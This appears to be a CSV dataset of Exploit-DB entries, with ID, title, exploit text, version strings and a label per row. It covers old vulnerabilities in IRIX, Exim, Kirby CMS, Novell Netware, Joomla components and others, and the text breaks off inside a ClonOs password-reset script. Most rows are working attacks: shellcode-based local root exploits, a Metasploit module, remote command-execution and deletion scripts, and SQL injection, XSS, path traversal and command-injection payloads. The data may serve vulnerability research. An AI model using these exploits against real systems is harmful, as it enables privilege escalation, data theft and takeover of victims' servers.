26132,"Fobuc Guestbook 0.9 - SQL Injection # Exploit Title   : Fobuc Guestbook 0.9 SQL Injection # Date            : 11 June 2013 # Exploit Author  : CWH Underground # Site            : www.2600.in.th # Vendor Homepage : http://sourceforge.net/projects/fobuc/ # Software Link   : http://jaist.dl.sourceforge.net/project/fobuc/0.9/Release/FOBUC_0.9.zip # Version         : 0.9 # Tested on       : Window and Linux      ,--^----------,--------,-----,-------^--,   | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..   `+---------------------------^----------|     `\_,-------, _________________________|       / XXXXXX /`|     /      / XXXXXX /  `\   /     / XXXXXX /\______(    / XXXXXX /           / XXXXXX /  (________(             `------'    ############################## VULNERABILITY: SQL Injection  ##############################    /index.php (LINE: 146-155)    ----------------------------------------------------------------------------- LINE 146-149:   $category_filter = $_GET['category']; $query = ""SELECT * FROM comments WHERE approved = 1 AND category = '$category_filter' AND responding = 0 ORDER BY id LIMIT $start, $displayed_entries""; $filter = 'category'; $total_query = ""SELECT * FROM comments WHERE approved = 1 AND category = '$category_filter' AND responding = 0""; -----------------------------------------------------------------------------   ----------------------------------------------------------------------------- LINE 155:   $total_comments = mysql_num_rows(mysql_query($total_query)); -----------------------------------------------------------------------------           ##################################################### DESCRIPTION FOR SQL INJECTION #####################################################    An attacker might execute arbitrary SQL commands on the database server with this vulnerability. User tainted data is used when creating the database query that will be executed on the database management system (DBMS). An attacker can inject own SQL syntax thus initiate reading, inserting or deleting database entries or attacking the underlying operating system depending on the query, DBMS and configuration.   POC:   http://target/fobuc/index.php?category=1%27%20and%201%20div%200%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29,3,4,5,6,7,8,9,10--+       ################################################################################################################  Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 ################################################################################################################",['0.9'],1
20128,"IRIX 6.5.x - '/usr/sbin/dmplay' Local Buffer Overflow /* source: https://www.securityfocus.com/bid/1528/info  Certain versions of IRIX ship with a version of dmplay which is vulnerable to a buffer overflow attack. The program, dmplay, is used to play movie files under IRIX. The problem at hand is the way the program handles the DISPLAY variable for the users X terminal. It does not check bounds and therefore is vulnerable to attack by an overly long user supplied string.  */  /*## copyright LAST STAGE OF DELIRIUM oct 1997 poland        *://lsd-pl.net/ #*/ /*## /usr/sbin/dmplay                                                        #*/  #define NOPNUM 800 #define ADRNUM 156 #define PCHNUM 148 #define TMPNUM 52  char shellcode[]=     ""\x04\x10\xff\xff""    /* bltzal  $zero,<shellcode>    */     ""\x24\x02\x03\xf3""    /* li      $v0,1011             */     ""\x23\xff\x01\x14""    /* addi    $ra,$ra,276          */     ""\x23\xe4\xff\x08""    /* addi    $a0,$ra,-248         */     ""\x23\xe5\xff\x10""    /* addi    $a1,$ra,-240         */     ""\xaf\xe4\xff\x10""    /* sw      $a0,-240($ra)        */     ""\xaf\xe0\xff\x14""    /* sw      $zero,-236($ra)      */     ""\xa3\xe0\xff\x0f""    /* sb      $zero,-241($ra)      */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""/bin/sh"" ;  char jump[]=     ""\x03\xa0\x10\x25""    /* move    $v0,$sp              */     ""\x03\xe0\x00\x08""    /* jr      $ra                  */ ;  char nop[]=""\x24\x0f\x12\x34"";  main(int argc,char **argv){     char buffer[10000],adr[4],pch[4],tmp[4],*b,*envp[2],display[128];     int i;      printf(""copyright LAST STAGE OF DELIRIUM oct 1997 poland  //lsd-pl.net/\n"");     printf(""/usr/sbin/dmplay for irix 6.2 6.3 IP:17,19,20,21,22,32\n\n"");      if(argc!=3){         printf(""usage: %s {62|63} xserver:display\n"",argv[0]);         exit(-1);     }      if(!strcmp(argv[1],""62"")){         *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10396+32;         *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10396+32+900+30540;         *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10396+32+8000;     }     if(!strcmp(argv[1],""63"")){         *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10348+32;         *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10348+32+900-84;         *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10348+32+8000;     }      sprintf(display,""DISPLAY=%s"",argv[2]);     envp[0]=display;     envp[1]=0;      b=buffer;     for(i=0;i<NOPNUM;i++) *b++=nop[i%4];     for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];     *b++=0xff;     for(i=0;i<ADRNUM;i++) *b++=adr[i%4];     for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];     for(i=0;i<PCHNUM;i++) *b++=pch[i%4];     *b=0;      execle(""/usr/sbin/dmplay"",""lsd"",buffer,0,envp); }",['6.5.x'],1
5769,"Telephone Directory 2008 - Arbitrary Delete Contact #!/usr/bin/perl -w # Telephone Directory 2008 <=  Arbitrary Delete Contact ######################################## #[*] Founded &  Exploited by : Stack #[*] Contact: Ev!L =>> see down #[*] Greetz : Houssamix & Djekmani & Jadi &  iuoisn & hak3r-b0y All muslims HaCkeRs  :) #[*]  Special Thnx To : Simo64  L3azzzzzz khouya ######################################## #----------------------------------------------------------------------------# ######################################## # * TITLE:          PerlSploit Class # * REQUIREMENTS:   PHP 4 / PHP 5 # * VERSION:        v.1 # * LICENSE:        GNU General Public License # * ORIGINAL URL:   http://www.v4-Team/v4.txt # * FILENAME:       PerlSploitClass.pl # * # * CONTACT:        Wanted  (french / english / arabic / moroco Darija :d ) # * THNX : AllaH # * GREETZ:         Houssamix & Djekmani ######################################## #----------------------------------------------------------------------------# ######################################## system(""color f""); print ""\t\t############################################################\n\n""; print ""\t\t#   Telephone Directory 2008 <=  Arbitrary Delete Contact  #\n\n""; print ""\t\t#                          by Stack                        #\n\n""; print ""\t\t############################################################\n\n""; ######################################## #----------------------------------------------------------------------------# ######################################## use LWP::UserAgent; die ""Example: perl $0 http://victim.com/path/\n"" unless @ARGV; print ""\n[!] ContactID : ""; chomp(my $id=<STDIN>); $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'); $host = $ARGV[0] . ""/del_query1.php?id="".$id.""""; $res = $b->request(HTTP::Request->new(GET=>$host)); $answer = $res->content; if ($answer =~ /Contact(.*?)<br>/){         print ""\nBrought to you by v4-team.com...\n"";         print ""\n[+] Contact$1\n"";}   else{print ""\n[-] Exploit Failed...\n"";}    ######################################## #-------------------         Exploit exploited by Stack       --------------------# ########################################  # milw0rm.com [2008-06-09]",['2008'],1
20333,"Exim Buffer 1.6.2/1.6.51 - Local Overflow /* source: https://www.securityfocus.com/bid/1859/info  A potential local root yielding buffer overflow vulnerability exists in Exim mail client version 1.62.   A buffer used in processing filenames of message attachments can be overflowed by a maliciously-formed filename. As a result, the excessive data copied onto the stack can overwrite critical parts of the stack frame such as the calling functions' return address. Since this data is supplied by the user it can be a crafted so that alter the program's flow of execution. If properly exploited, this can yield root privilege to the attacker. */  /* sample code for one OS/compiler combination; ./this ./exim -bt you */  char code[] = { 0x31,0xc0 /* eax = 0 */ , 0x50 /* push eax */ , 0xbb,0x98,0x30,0x04,0x00 /* ebx = 0x43098; &seteuid in my copy of exim */ , 0xff,0xd3 /* call ebx */ , 0x31,0xc0 , 0x50 , 0xb8,0x9a,0xd1,0x03,0x00 /* eax = 0x3d19a; &""/bin/sh"" in my copy of exim */ , 0x50 , 0x50 , 0xbb,0xf8,0x29,0x04,0x00 /* ebx = 0x429f8; &execl in my copy of exim */ , 0xff,0xd3 , 0x00 /* just to terminate the last string in the environment */ } ;  char buf[1000]; char *env[1001];  void main(argc,argv) int argc; char **argv; { int i; int j;  for (i = 0;i < sizeof buf;++i) buf[i] = 0x90; /* nop */ memcpy(buf + sizeof buf - sizeof code,code,sizeof code);  j = 0; env[0] = buf; for (i = 0;i < sizeof buf;++i) if (!buf[i]) env[++j] = buf + i + 1; env[j] = 0;  if (argv[1]) execve(argv[1],argv + 1,env); exit(1); }","['1.6.2/1.6.51', '1.62']",1
38255,"Kirby CMS 2.1.0 - Authentication Bypass ============================================= - Release date: 14.09.2015 - Discovered by: Dawid Golunski - Severity: Medium/High =============================================    I. VULNERABILITY -------------------------  Kirby CMS <= 2.1.0     Authentication Bypass via Path Traversal    II. BACKGROUND -------------------------  - Kirby CMS  ""Kirby is a file‑based CMS Easy to setup. Easy to use. Flexible as hell.""  http://getkirby.com/    III. INTRODUCTION -------------------------  KirbyCMS has a vulnerability that allows to bypass authentication in a hosting environment where users within the same shared environment can save/read files in a directory accessible by both the victim and the attacker.   IV. DESCRIPTION -------------------------   As KirbyCMS is a file based CMS, it also stores authentication data within files in accounts directory, each user has its own password file such as: kirby/site/accounts/[username].php At login, KirbyCMS refer to the password file to verify the passwor hash.  During the process, it fails to validate the resulting path to ensure that it does not contain path traversal sequences such as '../' within the login variable provided by a user.   This makes it vulnerable to a path traversal attack and allows to bypass  the authentication if an attacker is located in the same multi-user hosting  environment and can write files to a public directory such as /tmp accessible  by the victim site with KirbyCMS.  The exact code responsible for this vulnerability is located in  kirby/core/user.php file and is shown below:  ---[ kirby/core/user.php ]---  abstract class UserAbstract {    protected $username = null;   protected $cache = array();   protected $data = null;    public function __construct($username) {      $this->username = str::lower($username);      // check if the account file exists     if(!file_exists($this->file())) {       throw new Exception('The user account could not be found');     }         ...   }    protected function file() {     return kirby::instance()->roots()->accounts() . DS . $this->username() . '.php';   }  -----------------------------   In addition to the authentication bypass KirbyCMS was found to allow authentication over HTTP protocol (resulting in passwords being sent  unencrypted), and to never expire authenticated sessions.   V. PROOF OF CONCEPT -------------------------  KirbyCMS stores credentials in: kirby/site/accounts directory as PHP files to prevent the contents from being accessed directly via the web server.   An example file with credentials looks as follows:  ---[ victimuser.php ]---  <?php if(!defined('KIRBY')) exit ?>  username: victim email: victim@mailserver.com password: >   $2a$10$B3DQ5e40XQOSUDSrA4AnxeolXJNDBb5KBNfkOCKlAjznvDU7IuqpC language: en role: admin  ------------------------  To bypass the authentication an attacker who has an account in the same hosting environment as the victim can write the above credentials file  containing an encrypted hash of the password: trythisout into a public directory such as:  /tmp/bypassauth.php  Because of the aformentioned Path Traversal vulnerability the attacker can use such credentials and log in as an administrator  (via: http://victim-server.com/kirby/panel/login) with:  Username: ../../../../../../../../tmp/bypassauth Password: trythisout  which will produce a HTTP POST request similar to:  POST /kirby/panel/login HTTP/1.1 Host: victim_kirby_site Cookie: PHPSESSID=mqhncr49bpbgnt9kqrp055v7r6; kirby=58eddb6... Content-Length: 149  username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fbypassauth&password=trythisout&_csfr=erQ1UvOm2L1...   This will cause KirbyCMS to load credentials from the path:  /sites/victim/kirby/site/accounts/../../../../../../../../tmp/bypassauth.php   As a result, the attacker will get the following response:  <h2 class=""hgroup hgroup-single-line cf""> <span class=""hgroup-title"">   <a href=""#/users/edit/../../../../../../../../tmp/bypassauth"">Your account</a> </span> <span class=""hgroup-options shiv shiv-dark shiv-left"">  getting access to the KirbyCMS control panel with admin rights.   VI. BUSINESS IMPACT -------------------------  Users who make use of vulnerable versions of KirbyCMS in shared hosting environments are at risk of having their website modified by unauthorized users. An attacker who manages to log in as an administrator will be able to change all the existing content as well as upload new files.  This attack could be combined with the: 'CSRF Content Upload and PHP Script  Execution' vulnerability, also discovered by Dawid Golunski and described in a  separate document.   VII. SYSTEMS AFFECTED -------------------------  The latest version of KirbyCMS (2.1.0) was confirmed to be exploitable.  To exploit the vulnerability an attacker must be able to write a malicious credentials file on the system in a public directory that is accessible by the victim KirbyCMS site. This is a common situation on many hosting environments that allow to write/read files from temporary directories such as /tmp,  /var/tmp etc.  Such file could potentially also be uploaded by other means, even if the attacker does not have an account on the same server, such as anonymous FTP , an email attachment which gets saved in a tmp file on the server etc.    VIII. SOLUTION -------------------------  Upgrade to the patched version 2.1.1 released by the vendor upon this advisory.   IX. REFERENCES -------------------------  http://legalhackers.com  http://legalhackers.com/advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.txt  http://getkirby.com/  http://seclists.org/fulldisclosure/2015/Sep/index.html http://www.securiteam.com/   X. CREDITS -------------------------  The vulnerability has been discovered by Dawid Golunski dawid (at) legalhackers (dot) com legalhackers.com   XI. REVISION HISTORY -------------------------  14.09.2015 - Final   XII. LEGAL NOTICES -------------------------  The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. I accept no responsibility for any damage caused by the use or misuse of this information.",['2.1.0'],1
14866,"Novell Netware 6.5 - OpenSSH Remote Stack Overflow #####################################################################################  Application:   Novell Netware OpenSSH Remote Stack Overflow  Platforms:  Netware 6.5  Exploitation:   Remote code execution  CVE Number:  Novell TID:   7006756  ZeroDayInitiative: ZDI-10-169  Author:   Francis Provencher (Protek Research Lab's)  Blog:   http://www.protekresearchlab.com/   #####################################################################################  1) Introduction 2) Report Timeline 3) Technical details 4) The Code   #####################################################################################  =============== 1) Introduction ===============  Novell, Inc. is a global software and services company based in Waltham, Massachusetts. The company specializes in enterprise operating systems, such as SUSE  Linux Enterprise and Novell NetWare; identity, security, and systems management solutions; and collaboration solutions, such as Novell Groupwise and Novell  Pulse.  Novell was instrumental in making the Utah Valley a focus for technology and software development. Novell technology contributed to the emergence of local  area networks, which displaced the dominant mainframe computing model and changed computing worldwide. Today, a primary focus of the company is on developing  open source software for enterprise clients.  (http://en.wikipedia.org/wiki/Novell)  #####################################################################################  ============================ 2) Report Timeline ============================  2010-04-06 The details of this case have been submitted to the vendor as ZDI-CAN-674. 2010-09-01 Vendor respond with an advisory without nothing to fix the vulnerability.   #####################################################################################  ============================ 3) Technical details ============================  This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Novell Netware. Authentication is required to exploit  this vulnerability.  The flaw exists within SSHD.NLM. When the application attempts to resolve an absolute path on the server, a 512 byte destination buffer is used without  bounds checking. By providing a large enough value, an attacker can cause a buffer to be overflowed. Successful exploitation results in remote code execution  under the context of the server.  #####################################################################################  =========== 4) The Code ===========   #!/usr/bin/perl  use Net::SSH2; use Getopt::Std;  @overflow = ('A' x 1034);  getopts('H:P:u:p:', \%opts); $host = $opts{'H'}; $port = $opts{'P'}; $username = $opts{'u'}; $password = $opts{'p'};  if(!defined($host) || !defined($username)) {      print ""\nUsage: $0 -H <host> -P [port] -u <username> -p [password]\n\n"";      exit(0);  }   print ""\SCP Get... Beep, Beep""; foreach(@overflow) { $ssh2 = Net::SSH2->new(); $ssh2->connect($host, $port)               || die ""\nError: Connection Refused!\n""; open(FD, '>>sshfuzz.log'); print FD $host . ""\n"" . $_ . ""\n\n""; $ssh2->auth_password($username, $password) || die ""\nError: Username/Password Denied!\n""; $fuzzssh = $_; $scpget = $ssh2->scp_get($fuzzssh); $ssh2->disconnect(); } sleep(1);   close(FD); close(FDD); close(FDDD); close(FDDDD);  exit;      ##################################################################################### (PRL-2010-07)",['6.5'],1
23197,"Mah-Jong 1.4 - MJ-Player Server Flag Local Buffer Overflow // source: https://www.securityfocus.com/bid/8729/info  A problem in the handling of large requests supplied with certain flags has been reported in Maj-Jong. Because of this, it may be possible for a local attacker to gain elevated privileges.  /* *   mj-server(client) local root(possible in debian)  exploit *   test in (redhat7.2----redhat8.0) *   coded by jsk * *  (c) Ph4nt0m Security Team  /www.ph4nt0m.org * */ #include <stdio.h> #include <stdlib.h> #include <unistd.h> #define BUFSIZE 150   char shellcode[] = ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"" ""x31xc0x31xdbxb0x17xcdx80xebx1fx5ex89x76x08x31"" ""xc0x88x46x07x89x46x0cxb0x0bx89xf3x8dx4ex08x8d"" ""x56x0cxcdx80x31xdbx89xd8x40xcdx80xe8xdcxffxff"" ""xffx2fx62x69x6ex2fx73x68x58""; void banner (void);  void banner (void) { fprintf (stdout, ""\n [+] mj-server local  exploit mail:<jsk@ph4nt0m.net>""); fprintf (stdout, ""\n [+] by jsk < <a href=""http://www.ph4nt0m.org"" target=""_blank""><a href=""http://www.ph4nt0m.org"" target=""_blank"">www.ph4nt0m.org</a></a>> talk with me <irc.0x557.org #ph4nt0m> ""); fprintf (stdout, ""\n [+] spawning shell \n\n""); }  int main(void) {     char buf[BUFSIZE+16];     char *prog[] = {""/home/mj-1.4-src/mj-server"",""--server"", buf, NULL};     char *env[] = {""HOME=jsk"", shellcode, NULL};     unsigned long ret = 0xc0000000 - sizeof(void *) - strlen(prog[0]) -     strlen(shellcode) - 0x02;     memset(buf,0x41,sizeof(buf));     memcpy(buf+BUFSIZE,(char *)&ret,4);     memcpy(buf+BUFSIZE+4,(char *)&ret,4);     memcpy(buf+BUFSIZE+8,(char *)&ret,4);     buf[BUFSIZE+12] = 0x00;     printf(""\n [+] Using address: 0x%x"", ret);     banner ();     execve(prog[0],prog,env);     return 0; }",['1.4'],1
8721,"Zervit Web Server 0.04 - GET Remote Buffer Overflow (PoC) #!/usr/bin/perl # Zervit webserver 0.4 Bof Poc # make it just for fun :s use LWP::Simple; use LWP::UserAgent;   if (@ARGV < 2) {             print(""Usage: $0 <url> <port>\n"");             print(""TARGETS are\n "");             print(""Example: perl $0 127.0.0.1 777 \n"");             exit(1);                     }                     ($target, $port) = @ARGV;         print(""Zervit Webserver 0.04 bof xpl : Coded by Stack!\n"");         print(""Attacking $target on port $port!\n"");         print(""Ddossing .......\n"");         $dos =""\x41"" x 1000 ;         $temp=""/"" x 2;          my $url= ""http://"". $target. "":"" . $port .$temp . $dos;             $content=get $url;             print(""\n Server Bofed"");  # milw0rm.com [2009-05-18]",['0.04'],1
19531,"Cisco IOS 12.0.2 - Syslog Crash source: https://www.securityfocus.com/bid/675/info  Cisco devices running classic IOS are reported prone to a denial of service vulnerability. The issue occurs when a vulnerable device receives and processes a UDP packet on UDP port 514 for syslog. This issue results in a crash or hang requiring a reboot.  Vulnerable IOS software may be found on the following Cisco devices:  - Cisco routers in the AGS/MGS/CGS/AGS+, IGS, RSM, 8xx, ubr9xx, 1xxx, 25xx, 26xx, 30xx, 36xx, 38xx, 40xx, 45xx, 47xx, AS52xx, AS53xx, AS58xx, 64xx, 70xx, 72xx (including the ubr72xx), 75xx, and 12xxx series. -Recent versions of LS1010 ATM switch. -Catalyst 2900XL LAN switch. -Cisco DitributedDirector.   nmap -sU -p514 <IP-of-Cisco-device>",['12.0.2'],1
36447,"Pulse Pro 1.7.2 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/51056/info  Pulse Pro is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Pulse Pro 1.7.2 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?p=blocks&d=""><script>alert(1)</script> http://www.example.com/index.php?p=edit-post&post_id=""><script>alert(1)</script>",['1.7.2'],1
18547,"DJ Studio Pro 5.1 - '.pls' Local Stack Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'DJ Studio Pro 5.1 .pls Stack Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack-based buffer overflow in DJ Studio Pro 5.1.6.5.2. 				When handling a .pls file, DJ Studio will copy the user-supplied data on the stack 				without any proper bounds checking done beforehand, therefore allowing code 				execution under the context of the user. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Sebastien Duquette', 					'Death-Shadow-Dark <death.shadow.dark[at]gmail.com>', 				], 			'References'     => 				[ 					[ 'CVE', '2009-4656'], 					[ 'OSVDB', '58159'], 					[ 'URL', 'http://www.exploit-db.com/exploits/10827' ] 				], 			'Payload'        => 				{ 					'Space'    => 5000, 					'BadChars' => ""\x00\x0a\x3d"", 					'StackAdjustment' => -3500, 				}, 			'Platform' => 'win', 			'Targets'        => 				[ 					# POP EBX # POP ECX # RET 8 					# DJStudioPro.exe 					[ 'DJ Studio Pro 5.1.6.5.2', { 'Ret' => 0x014FC62D } ], 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Dec 30 2009', 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']), 				], self.class)  	end  	def exploit  		sploit = rand_text_alpha_upper(1308) 		sploit << generate_seh_payload(target.ret) 		sploit << rand_text_alpha_upper(10000)  		print_status(""Creating '#{datastore['FILENAME']}' file ..."")  		file_create(sploit)  	end  end","['5.1', '5.1.6.5.2']",1
19691,"Tony Greenwood WebWho+ 1.1 - Remote Command Execution source: https://www.securityfocus.com/bid/892/info  WebWho+ is a free cgi script written by Tony Greenwood for executing whois queries via the www. Though it does perform checks for shell escape characters on some parameters, it misses the 'type' variable and allows for malicious input to be sent to a shell. It is possible to execute arbitrary commands on a webserver running WebWho+ v1.1 with the uid of the webserver (usually nobody).   #!/usr/bin/perl # # hhp-webwho.pl # WebWho+ v1.1 (whois cgi) remote exploit. # # By: loophole of hhp. # [12/26/99] # # http://hhp.perlx.com/ # loophole@hhp.perlx.com # # Advisrory: http://hhp.perlx.com/ouradvisories/hhp-webwho.txt  use IO::Socket;  if (@ARGV < 2)  {   print ""* hhp-webwho.pl\n"";   print ""* webwho.pl (whois cgi) remote exploit.\n"";   print ""* By: loophole of hhp.\n"";   print ""* loophole\@hhp.perlx.com\n"";   print ""* http://hhp.perlx.com/\n\n"";   print ""USAGE: $0 <Server> [-e <File Extention>] <Command>\n\n"";   print ""* Server         = www.example.com\n"";   print ""* File Extension = /cgi-bin/webwho.pl\n"";   print ""* Command        = Shell command\n\n"";   print ""* NOTE: Defualt <File Extension> is /cgi-bin/webwho.pl\n"";   print ""*       It only needs changing if it is not the defualt.\n\n"";   print ""* EXAMPLE: $0 www.gat.org id\n"";   print ""*      OR: $0 www.gat.org -e /jack/webwho.pl id\n"";   exit 0;  }  if ($ARGV[1] eq ""-e"")  {   if (@ARGV != 4)    {     print ""Invalid Usage!\n"";     exit 0;    }   $server     = $ARGV[0];   $saywhatnig = $ARGV[2];   $command    = $ARGV[3];  }   else    {     if (@ARGV == 2)      {       $server     = $ARGV[0];       $command    = $ARGV[1];       $saywhatnig = ""/cgi-bin/webwho.pl"";      }    }  $sock = IO::Socket::INET->new(PeerAddr => $server,                               PeerPort => 80,                                  Proto => ""tcp"") or die ""Wack connection.\n"";  $calkuhlashun = 45 + length($command);    print $sock ""POST $saywhatnig HTTP/1.1\n"";   print $sock ""Accept-Language: en-us\n"";   print $sock ""Host: $server\n"";   print $sock ""Content-Length: $calkuhlashun\n"";   print $sock ""Connection: Keep-Alive\n\n"";   print $sock 'command=X&type="";echo fukk;';   print $sock ""$command"";   print $sock "";echo fokk&Check=X\n"";   $doot = 0;    while(<$sock>)    {     s/\n//g;     s/fukk<br>/--------Exploit Stats------------/;     s/fokk<br>/-hhpfoelife-\n/;     s/<br>//g;     $foo = $_;       if ($foo =~ /---Ex/)       {        $doot = 1;       }       if ($foo =~ /-hhpfoelife-/)       {        $doot = 0;        print ""---------------------------------\n"";        exit 0;       }       if ($doot == 1)        {        print ""$foo\n"";       }      } exit 0;","['1.1', 'v1.1']",0
47398,"Hospital-Management 1.26 - 'fname' SQL Injection # Exploit Title: Hospital-Management 1.26 - 'fname' SQL Injection # Author: Cakes # Discovery Date: 2019-09-18 # Vendor Homepage: https://github.com/Mugerwa-Joseph/hospital-management # Software Link: https://github.com/Mugerwa-Joseph/hospital-management/archive/master.zip # Tested Version: 1.26 # Tested on OS: CentOS 7 # CVE: N/A  # Discription: # Simple SQL injection after application authentication.   # Type: boolean-based blind # Title: AND boolean-based blind - WHERE or HAVING clause # Payload:   fname=tester'||(SELECT 0x72516679 FROM DUAL WHERE 9119=9119 AND 1379=1379)||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add  # Type: error-based # Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) # Payload:   fname=tester'||(SELECT 0x53495778 FROM DUAL WHERE 5761=5761 AND (SELECT 9648 FROM(SELECT COUNT(*),CONCAT(0x71787a7a71,(SELECT (ELT(9648=9648,1))),0x716b786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add  # Type: time-based blind # Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) # Payload:   fname=tester'||(SELECT 0x5144494b FROM DUAL WHERE 1043=1043 AND (SELECT 1880 FROM (SELECT(SLEEP(5)))AmmF))||'&sname=tester&email=test@tester.com&phone=1123456783&address=123 happy lane&gender=Male&bloodgroup=B&birthyear=2002&btn=Add",['1.26'],1
6733,mini-pub 0.3 - File Disclosure / Code Execution mini-pub 0.3 multiple vulnerabilities  download   http://sourceforge.net/projects/mini-pub/  author     muuratsalo contact    muuratsalo[at]gmail.com  exploits 1. local file disclosure http://localhost/mini-pub.php/front-end/img.php?sFileName=http://site.com/cmd.txt?  2. local file disclosure http://localhost/mini-pub.php/front-end/cat.php?sFileName=/etc/passwd  3. command execution http://localhost/mini-pub.php/front-end/cat.php?sFileName=a%3Benv  # milw0rm.com [2008-10-12],['0.3'],1
15989,"Joomla! Component People 1.0.0 - SQL Injection People Joomla Component 1.0.0 SQL Injection Vulnerability   Name              People  Vendor            http://www.ptt-solution.com  Versions Affected 1.0.0   Author            Salvatore Fresta aka Drosophila  Website           http://www.salvatorefresta.net  Contact           salvatorefresta [at] gmail [dot] com  Date              2011-01-14  X. INDEX   I.    ABOUT THE APPLICATION  II.   DESCRIPTION  III.  ANALYSIS  IV.   SAMPLE CODE  V.    FIX    I. ABOUT THE APPLICATION ________________________  The component shows all of your people in a  professional scroll  bar  where  visitors  take the first attention to their looks and positions.   II. DESCRIPTION _______________  A parameter is not properly sanitised  before  being used in SQL queries.   III. ANALYSIS _____________  Summary:   A) SQL Injection    A) SQL Injection ________________  The id parameter is not  properly  sanitised before being used in SQL queries.  This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.   IV. SAMPLE CODE _______________  A) SQL Injection  http://site/path/index.php?option=com_people&controller=people&task=details&id=-1 UNION SELECT username,password,3 FROM jos_users   V. FIX ______  No fix.",['1.0.0'],1
10287,"MundiMail 0.8.2 - Remote Code Execution # Reference: http://www.ccat.edu.mx/advisors/advisor5/advisor5.html # Credits: Ccat Research Labs   - México - Coatepec, Ver.  www.ccat.edu.mx  # Software Link: http://sourceforge.net/projects/mundimail/ # Tested on: Debian, Centos & Windows Server 2000  Preview:  Code uses System() and Exec() without good practices in security.   1.- First Vulnerable Code  //need to kill daemon 		$cmd = ""/bin/kill""; 		$cmd .= "" "" . $_REQUEST[""mypid""]; 		system($cmd);  2.- Explotation  /admin/satus/index.php?mypid=command;   3.- Fixation   $cmd .= "" "" . escapeshellcmd($_REQUEST[""mypid""]);  4.- Second Vulnerable Code  $cmd = ROOTDIR . ""include/massmail.php""; 		$cmd .= ' ' . $_REQUEST[""idtag""]; 		$cmd .= ' > /dev/null'; 		$cmd .= ' &'; 		echo $cmd . ""<br>\n""; 		exec($cmd); 		$mid = ""../mail/success.php"";  5.- Explotation  /admin/status/index.php?idtag=command;   6.-fixation  $cmd .= ' ' . escapeshellcmd($_REQUEST[""idtag""]);   7.- Other  We Can use other types of Fixation bug this is an easy one ;)   8.- Greetz  www[dot]seguridadblanca[dot]com   -------------- Happy Hacking --------------",['0.8.2'],1
47544,"ClonOs WEB UI 19.09 - Improper Access Control # Exploit Title: ClonOs WEB UI 19.09 - Improper Access Control # Date: 2019-10-19 # Exploit Author: İbrahim Hakan Şeker # Vendor Homepage: https://clonos.tekroutine.com/ # Software Link: https://github.com/clonos/control-pane # Version: 19.09 # Tested on: ClonOs # CVE : 2019-18418   import requests from bs4 import BeautifulSoup import sys  def getUser(host):     reg=r'\""'     r1 = requests.post(host+""/json.php"",data={""mode"":""getJsonPage"",""path"":""/users/"",""hash"":"""",""db_path"":""""},headers={""X-Requested-With"":""XMLHttpRequest""})     r1_source = BeautifulSoup(r1.content,""lxml"")     for k in r1_source.findAll(""tr""):         for i in k.findAll(""td"")[0]:             print(f""[+]User Found: {i}  User id: {k.get('id').replace(reg,'')}"") def changePassword(host,user,password,id):     data={         ""mode"":""usersEdit"",         ""path"":""/users/"",         ""hash"":"""",         ""db_path"":"""",         ""form_data[username]"":f""{user}"",         ""form_data[password]"":f""{password}"",         ""form_data[password1]"":f""{password}"",         ""form_data[first_name]"":"""",         ""form_data[last_name]"":"""",         ""form_data[actuser]"":""on"",         ""form_data[user_id]"": int(id)         }     r2=requests.post(host,data=data,headers={""X-Requested-With"":""XMLHttpRequest""})     if r2.status_code==200:print(""[+]OK"")     else:print(""[-]Fail"") if __name__==""__main__"":     if len(sys.argv)>1:         if ""getUser"" in 